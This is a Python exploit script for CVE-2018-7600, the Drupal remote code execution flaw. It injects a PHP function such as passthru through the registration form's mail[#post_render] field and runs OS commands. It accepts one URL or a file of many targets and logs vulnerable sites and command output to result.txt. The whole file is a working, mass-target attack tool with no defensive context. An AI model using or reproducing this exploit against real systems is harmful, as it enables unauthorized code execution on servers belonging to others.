# -*- coding: utf-8 -*-
import sys
import requests
import argparse
requests.packages.urllib3.disable_warnings()

succlog=open('result.txt','a')

def send_http_payload(drupal_home_url, php_func, php_func_param):
    """Exploit CVE-2018-7600 drupal: Unsanitized requests
    allow remote attackers to execute arbitrary code
    """
    params = {
        'element_parents': 'account/mail/#value',
        'ajax_form': 1,
        '_wrapper_format': 'drupal_ajax'
    }
    payload = {
        'form_id': 'user_register_form',
        '_drupal_ajax': '1',
        'mail[#type]': 'markup',
        'mail[#post_render][]': php_func,
        'mail[#markup]': php_func_param
    }
    # Clean URLs - Enabled
    try:

        url = requests.compat.urljoin(drupal_home_url, '/user/register')

        return requests.post(
            url,
            params=params,
            data=payload,timeout=5
        )
    except:
        pass

def check(drupal_home_url):
    """Check if the target is vulnerable to CVE-2018-7600.
    """
    status = False

    randflag = 'CVE-2018-7600'
    vulnflag = randflag + '[{"command":"insert"'
    try:
        response = send_http_payload(drupal_home_url, 'printf', randflag)
        if response and response.status_code == 200 and randflag in response.text:
            succlog.write("[*] %s is vulnerable\n" % drupal_home_url)
            status = True
        else:
            print("[?] %s is unknown" % drupal_home_url)

        return status
    except:
        pass

def exploit(drupal_home_url, php_exec_func='passthru', command='whoami'):
    """Execute os command.
    """
    try:
        response = send_http_payload(drupal_home_url, php_exec_func, command)
        if '[{"command":"insert"' in response.text:
            command_output, _ = response.text.split('[{"command":"insert"')
            succlog.write(drupal_home_url+' '+command_output+'\n')
    except:
        pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='api help')
    parser.add_argument('-u', '--url', help='Please Input a url!', default='')
    parser.add_argument('-f', '--file', help='Please Input a file!', default='')
    args = parser.parse_args()
    url = args.url
    file = args.file
    if url != '':
        exploit(url, command='whoami')
    if file != "":
        f = open(file, 'r+')
        for i in f.readlines():
            url = i.strip()
            exploit(url, command='whoami')


